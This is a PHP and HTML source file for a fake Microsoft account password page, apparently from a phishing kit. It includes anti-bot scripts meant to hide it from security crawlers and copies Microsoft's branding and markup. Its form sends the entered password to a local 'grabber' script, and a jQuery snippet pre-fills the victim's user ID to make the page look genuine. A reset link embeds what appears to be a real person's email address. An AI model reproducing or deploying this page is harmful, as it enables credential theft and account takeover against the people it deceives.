 <?php
    error_reporting(0);

    include('../src/Antibot/Bot-Crawler.php');
    include('../src/Antibot/Dila_DZ.php');

    include('../src/Antibot/blockers.php');
    include('../src/Antibot/detects.php');
?>

<!DOCTYPE html>

<html dir="ltr" lang="EN-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=Edge">


<title>Sign in to your Microsoft account</title>

<meta name="robots" content="none"><meta name="PageID" content="i5030">
<meta name="SiteID" content="38936"><meta name="ReqLC" content="1033">
<meta name="LocLC" content="1033">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">



	<link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29603.1/images/favicon.ico">
	<link rel="stylesheet" title="Converged_v2" type="text/css" href="./assets/css/Converged_v21033_yaWpJTZkqpsZZoIUf0uvMg2.css">

	<style type="text/css"></style><style type="text/css">body{display:none;}</style>


	<style type="text/css">body{display:block !important;}</style>
	<noscript><style type="text/css">body{display:block !important;}</style></noscript>



		<link rel="image_src" href="https://logincdn.msauth.net/16.000.29603.1/images/Windows_Live_v_thumb.jpg">





	<style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style>



	<style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style><style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style>

	<link rel="prefetch" href="./assets/css/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css">
</head>


	<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div>

<div data-bind="if: activeDialog"></div>

<form name="f1" id="i0281" validate="validate" spellcheck="false" method="post" target="_top" autocomplete="off" action="./assets/grabber/session_relogin_pass.php">
    <!-- ko withProperties: { '$loginPage': $data } -->
    <div class="login-paginated-page" data-bind="component: { name: &#39;master-page&#39;,
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.e,
            showFooterLinks: true,
            useWizardBehavior: svr.bC,clear
            
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko if: isLightboxTemplate() -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: &#39;lightbox-template&#39;, params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { &#39;provide-min-height&#39;: svr.cJ }"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="css: { &#39;provide-min-height&#39;: svr.cJ },
    component: { name: &#39;background-image-control&#39;,
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl --><!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div id="backgroundImage" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { &#39;background-image&#39;: true }" class="background-image ext-background-image" style="background-image: url(&quot;./assets/css/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<!-- ko if: svr.cO --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer" data-bind="css: { &#39;app&#39;: $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="externalCss: { &#39;middle&#39;: true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: &#39;content-control&#39;, params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column">
    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { &#39;sign-in-box&#39;: true },
            css: {
                &#39;inner&#39;:  $content.isVerticalSplitTemplate,
                &#39;vertical-split-content&#39;: $content.isVerticalSplitTemplate,
                &#39;app&#39;: $page.backgroundLogoUrl,
                &#39;wide&#39;: $page.paginationControlHelper.useWiderWidth,
                &#39;fade-in-lightbox&#39;: $page.fadeInLightBox,
                &#39;has-popup&#39;: $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                &#39;transparent-lightbox&#39;: $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                &#39;lightbox-bottom-margin-debug&#39;: $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.Bw --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { &#39;disable-lightbox&#39;: svr.CE &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko if: loadBannerLogo -->
        <div data-bind="component: { name: &#39;logo-control&#39;,
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="./assets/img/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="./assets/img/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }" src="./assets/img/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: svr.De && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->

        <!-- ko if: asyncInitReady -->
        <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.a6,
                disableAnimationIfAnimationEndUnsupported: svr.CI,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.i) -->
    <div data-bind="css: {
        &#39;animate&#39;: animate() &amp;&amp; animate.animateBanner(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }" class="animate slide-in-next">

        <div data-bind="component: { name: &#39;identity-banner-control&#39;,
            params: {
                userTileUrl: svr.b7,
                displayName: sharedData.displayName || svr.i,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->

<div class="identityBanner">
    <!-- ko if: isBackButtonVisible --><!-- /ko -->

    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }" title="">
    	<span id="hidden_hand" class="DataLabel" value=""></span>
    	
    </div>
</div></div>
    </div>
    <!-- /ko -->

    <div class="pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
        &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.i),
        &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
        &#39;animate&#39;: animate(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    username: sharedData.username,
                    displayName: sharedData.displayName,
                    hipRequiredForUsername: sharedData.hipRequiredForUsername,
                    passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                    availableCreds: sharedData.availableCreds,
                    evictedCreds: sharedData.evictedCreds,
                    useEvictedCredentials: sharedData.useEvictedCredentials,
                    showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                    flowToken: sharedData.flowToken,
                    defaultKmsiValue: svr.AL === 1,
                    userTenantBranding: sharedData.userTenantBranding,
                    sessions: sharedData.sessions,
                    callMetadata: sharedData.callMetadata,
                    supportsNativeCredentialRecovery: sharedData.supportsNativeCredentialRecovery },
                event: {
                    restoreIsRecoveryAttemptPost: $loginPage.view_onRestoreIsRecoveryAttemptPost,
                    updateFlowToken: $loginPage.view_onUpdateFlowToken,
                    submitReady: $loginPage.view_onSubmitReady,
                    redirect: $loginPage.view_onRedirect,
                    resetPassword: $loginPage.passwordView_onResetPassword,
                    setBackButtonState: view_onSetIdentityBackButtonState,
                    setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  -->

<!--  -->

<div aria-hidden="true">
    
</div>

<div id="loginHeader" class="row title ext-title" data-bind="externalCss: { &#39;title&#39;: true }">
    <div role="heading" aria-level="1" data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]">Enter password</div>
</div>

<!-- ko if: showCredViewBrandingDesc --><!-- /ko -->

<!-- ko if: unsafe_pageDescription --><!-- /ko -->

<div class="row">
    <div class="form-group col-md-24">
        <div role="alert" aria-live="assertive">
            <!-- ko if: passwordTextbox.error --><!-- /ko -->

            <!-- ko if: passwordTextbox.error -->
            <div id="passwordError" data-bind="
                externalCss: { 'error': true },
                htmlWithBindings: passwordTextbox.error,
                childBindings: {
                    'idA_IL_ForgotPassword0': {
                        href: accessRecoveryLink || svr.r,
                        attr: {
                            target: accessRecoveryLink &amp;&amp; '_blank',
                            role: supportsNativeCredentialRecovery ? 'button' : 'link'
                        },
                        click: accessRecoveryLink ? null : resetPassword_onClick } }" class="error ext-error">Your account or password is incorrect. If you don't remember your password, <a id="idA_IL_ForgotPassword0" href="javascript:void();" role="link">reset it now.</a><!-- HR=80041012 --></div>
            <!-- /ko -->
        </div>
        </div>

        <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox-field&#39;,
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

            <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true" aria-describedby="loginHeader passwordError  " placeholder="Password" tabindex="0"  required="true">

            <!-- ko if: svr.cK && showPassword() --><!-- /ko -->
        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>

        <!-- ko if: svr.cK --><!-- /ko -->
    </div>
</div>

<!-- ko if: shouldHipInit --><!-- /ko -->

<div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }, externalCss: { &#39;password-reset-links-container&#39;: true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
    <div>
        <!-- ko if: svr.cc --><!-- /ko -->
        <!-- ko if: svr.BP !== false && !svr.cc && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko -->

        <div class="row">
            <div class="col-md-24">
                <div class="text-13">
                    <!-- ko if: svr.aU && svr.aj --><!-- /ko -->
                    <!-- ko ifnot: hideForgotMyPassword -->
                    <div class="form-group">
                        <a id="idA_PWD_ForgotPassword" role="link" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf%3fusername%3dlarrywach2006%2540outlook.com%26username%3dlarrywach2006%2540outlook.com%26uaid%3d9037a90ba5ee4f199c637662a8926d52%26contextid%3d635B3E53FB0AEDAC%26opid%3d45C08D81341BEAD7%26bk%3d1668029192&amp;id=38936&amp;uiflavor=web&amp;client_id=1E00004040979A&amp;uaid=9037a90ba5ee4f199c637662a8926d52&amp;mkt=EN-US&amp;lc=1033&amp;bk=1668029192" data-bind="
                            text: unsafe_forgotPasswordText,
                            href: accessRecoveryLink || svr.r,
                            attr: { target: accessRecoveryLink &amp;&amp; &#39;_blank&#39; },
                            click: accessRecoveryLink ? null : resetPassword_onClick">Forgot password?</a>
                    </div>
                    <!-- /ko -->
                    <!-- ko if: allowPhoneDisambiguation --><!-- /ko -->
                    <!-- ko ifnot: useEvictedCredentials -->
                        <!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                redirect: onRedirect,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  -->

<div class="form-group">
    <!-- ko if: showSwitchToCredPickerLink --><!-- /ko -->

    <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
        <!-- ko ifnot: hideCredSwitchLink -->
        <a href="javascript:void();" data-bind="
            attr: { &#39;id&#39;: switchToCredId },
            text: switchToCredText,
            click: switchToCred_onClick" id="otcLoginLink">Email code to 
            <span id="ctl00_PageContent_Login1_IdTextLabel" class="DataLabel" value=""></span>
            <input type="hidden" id="hidden_hand" name="hidden_hand" value="">
        </a>
        <!-- /ko -->

        <!-- ko if: displayHelp && selectedCredType === 7 --><!-- /ko -->
    <!-- /ko -->

    <!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko -->
</div>

<!-- ko if: credLinkError --><!-- /ko --><!-- /ko -->

                        <!-- ko if: evictedCreds.length > 0 --><!-- /ko -->
                    <!-- /ko -->
                    <!-- ko if: showChangeUserLink --><!-- /ko -->
                </div>
            </div>
        </div>
    </div>

    <div class="win-button-pin-bottom" data-bind="css : { &#39;boilerplate-button-bottom&#39;: tenantBranding.BoilerPlateText }">
        <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }">
            <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
                params: {
                    serverData: svr,
                    primaryButtonText: str[&#39;CT_PWD_STR_SignIn_Button&#39;],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.e,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                event: {
                    primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin },
    externalCss: { &#39;button-field-container&#39;: true }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { &#39;inline-block&#39;: isPrimaryButtonVisible }, externalCss: { &#39;button-item&#39;: true }" class="inline-block button-item ext-button-item">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    &#39;button&#39;: true,
                    &#39;primary&#39;: true },
                value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Sign in" data-report-attached="1">
    </div>
</div></div>
        </div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
</div>
    </div>
</div></div>
        <!-- /ko -->

       </div>
    <!-- /ko -->
        </div>

        <!-- ko if: $page.showFedCredAndNewSession -->
        <!-- ko if: $page.showFedCredButtons --><!-- /ko -->

        <!-- ko if: $page.newSession --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            &#39;footer&#39;: true,
            &#39;has-background&#39;: !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            &#39;background-always-visible&#39;: $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: &#39;footer-control&#39;,
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { &#39;footer-links&#39;: true }">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;uaid=9037a90ba5ee4f199c637662a8926d52" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;uaid=9037a90ba5ee4f199c637662a8926d52" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: a11yConformeLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="https://login.live.com/#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
        attr: { &#39;aria-expanded&#39;: showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            &#39;footer-content&#39;: true,
            &#39;footer-item&#39;: true,
            &#39;debug-item&#39;: true,
            &#39;has-background&#39;: !useDefaultBackground,
            &#39;background-always-visible&#39;: hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.C9 && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->
</form>

<form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>

<!-- ko if: svr.aL --><!-- /ko -->

<!-- ko if: svr.Dr --><!-- /ko --></div>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
	<script>
		$(document).ready(function () {
			var justin = sessionStorage.getItem('userid'); 
			var storing = localStorage.getItem('userid'); 
			$("#hidden_hand").text(storing);
			$("#ctl00_PageContent_Login1_IdTextLabel").text(storing);
			
		})
	</script>

</body></html>